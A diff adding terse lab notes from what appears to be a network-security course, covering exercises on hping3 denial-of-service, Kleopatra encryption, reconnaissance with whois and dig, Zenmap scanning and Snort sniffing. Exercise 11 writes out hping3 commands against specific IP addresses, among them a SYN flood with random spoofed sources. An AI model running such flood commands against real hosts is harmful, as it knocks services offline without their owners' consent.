@@ -1,0 +1,40 @@
+11. Implement DOS attack using Hping tool. 
+hping3 -h
+Sudo hping3  199.59.243.255
+Sudo hping3  199.59.243.255 -1
+Sudo hping3  199.59.243.255 -1 --fast
+
+Sudo hping3  199.59.243.255 -1 --faster
+
+Sudo hping3 -c 10000 -d 120 -S  -w  64 -p 21 --flood --rand-source www.hping3testsite.com
+
+
+
+12. Implement key generation, encryption & decryption using Kleopatra. 
+
+13. Perform passive and active reconnaissance using tools studied. 
+
+Passive
+whois google.com
+dig
+traceroute
+nslookup
+
+passive using tools
+archive.org
+whois
+netcraft
+
+14. Use Zenmap for network scanning and vulnerability detection.
+
+scanner.nmap.org   ping/quick/intense
+
+199.79.62.121
+
+ 15. Use SNORT for network sniffing and packet logging.
+
+Snort -V
+snort -v
+snort -vd
+snort -W
+snort -dev -1 C:\Snort\log
